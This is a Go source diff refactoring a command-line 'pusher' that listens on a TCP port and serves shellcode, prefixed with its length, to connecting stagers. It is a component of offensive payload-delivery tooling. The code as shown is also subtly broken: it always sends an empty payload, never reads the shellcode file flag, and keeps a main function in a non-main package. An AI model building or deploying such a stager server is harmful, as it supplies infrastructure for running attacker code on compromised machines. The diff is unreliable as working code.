@@ -1,4 +1,4 @@
-package main
+package pusher
 
 import (
 	"encoding/binary"
@@ -16,54 +16,62 @@ var opts struct {
 	fileName string
 }
 
-var pusher = &cobra.Command{
+var PusherCmd = &cobra.Command{
 	Use:   "pusher",
 	Short: "pusher pushes shellcode to a stager",
 	Run:   runPusherServer,
 }
 
 func init() {
-	pusher.PersistentFlags().StringVarP(&opts.address, "address", "a", ":5555", "listen address ([ip]:port)")
-	pusher.MarkPersistentFlagRequired("address")
-	pusher.PersistentFlags().StringVarP(&opts.net, "net", "n", "tcp", "dial network")
-	pusher.PersistentFlags().StringVarP(&opts.fileName, "shellcode", "s", "", "file containing the shellcode")
-	pusher.MarkPersistentFlagRequired("shellcode")
+	PusherCmd.PersistentFlags().StringVarP(&opts.address, "address", "a", ":5555", "listen address ([ip]:port)")
+	PusherCmd.PersistentFlags().StringVarP(&opts.net, "net", "n", "tcp", "dial network")
+	PusherCmd.PersistentFlags().StringVarP(&opts.fileName, "shellcode", "s", "", "file containing the shellcode")
+
+	_ = PusherCmd.MarkPersistentFlagRequired("address")
+	_ = PusherCmd.MarkPersistentFlagRequired("shellcode")
 }
 
 func runPusherServer(cmd *cobra.Command, args []string) {
 	ln, err := net.Listen(opts.net, opts.address)
 	if err != nil {
-		log.Fatalf("Listen failed: %v\n", err)
+		log.Fatalf("listen: %v\n", err)
 	}
+
 	log.Printf("Listening on %s/%s\n", opts.address, opts.net)
 
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			log.Printf("Could not establish connection: %v", err)
+			log.Printf("accept: %v", err)
 			continue
 		}
+
 		go serveShellcode(conn, []byte{})
 	}
 }
 
 func serveShellcode(conn net.Conn, shellcode []byte) {
 	defer conn.Close()
+
 	log.Printf("Serving shellcode to %s", conn.RemoteAddr())
+
 	size := make([]byte, 4)
 	binary.LittleEndian.PutUint32(size, uint32(len(shellcode)))
+
 	_, err := conn.Write(size)
 	if err != nil {
 		log.Fatalf("Error anouncing shellcode size: %v", err)
 	}
+
 	_, err = conn.Write(shellcode)
 	if err != nil {
 		log.Fatalf("Error sending shellcode: %v", err)
 	}
 }
 
+// nolint:go-lint
 func main() {
-	if err := pusher.Execute(); err != nil {
+	if err := PusherCmd.Execute(); err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
